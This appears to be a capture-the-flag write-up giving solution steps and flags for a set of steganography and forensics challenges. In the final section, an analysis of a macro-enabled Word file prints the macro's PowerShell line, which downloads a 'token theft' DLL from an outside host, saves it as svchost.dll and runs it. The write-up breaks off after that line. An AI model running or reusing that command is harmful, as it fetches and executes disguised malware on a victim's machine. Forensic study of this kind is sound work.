# uwe-steg-challenge

## Dj Khaled
Used the strings command to expose the flag at the bottom of the output - flag{alw4y3_l00k_4_5tr1n9s}

## PCAP 1 
- Opened the PCAP in wireshark 
- Used the filter `http.content_type contains "image/png"` packet no `16681` was the only one 
- File -> Export Objects -> HTTP -> Text Filter "PNG" -> export `meow.png`
- Open the file to reveal the flag - flag{PC4P_4_FL4GZ}

## SHREK.GIF
- Opend the gif in ezgif.com
- split the gif into frames
- one of the frames contained the flag - flag{g3t_shr3k3d_sk1d}


![image](https://github.com/user-attachments/assets/5f75bedd-4a62-4152-915b-522ce7eae8aa)


## Steghide 1
 - Ran command `steghide -sf uwe.jpg`
 - Exported a file called `stage.ps1`
 - There was a base64 encoded string `ZmxhZ3tuMHRfdG9vX2g0cmRfcmlnaHQ/fQ==`
 - The docoded string in cyberchef revealed the flag - flag{n0t_too_h4rd_right?}

## Steghide 2 
 - Ran command `strings uwe2.jpg`
 - below the file signature there was the line `XHey GCHQ! Use this for the st3gh1d3 pwd (remember to decode it!): ==wL6kHdpJXdjV2UyJ3R`
 - flipped the string and decoded it using base64 within the terminal `echo "R3JyU2VjdXJpdHk6Lw==" | base64 -d`
 - the command returned `GrrSecurity:/ `
 - ran command `steghide extract -sf uwe2.jpg` and used the password to return a `flag` file
 - the flag file contained `QlpoOTFBWSZTWRvPsyUAAATLgAAQTAAAAKXlFIogADFNMjExMQpkGgejSSNc6jujSwBhTBwpE/F3JFOFCQG8+zJQ`
 - using CyberChef the string was decoded first from base64 then using Bzip2 Decompress returning the flag - flag{g3tting_h4rd3r_n0w}

## Hard 
 - Ran command `binwalk -e test.docm` to extract data from the the docm file
 - there were two images contained in the doc  `image1.jpeg` and `image2.png`
 - ran command `binwalk -e image2.png` 
 - Ran the command `olevba test.docm` as there was a vba macro present
 - the output showed a base64 encoded url `$Command = "Invoke-WebRequest -Uri 'https://github.com/polygonben/polygonben.github.io/raw/refs/heads/master/assets/images/tok3n_th3ft.dll' -OutFile 'C:\temp\svchost.dll'; rundll32.exe C:\temp\svchost.dll,EntryPoint"` which downloads a dll file and runs it
 - 




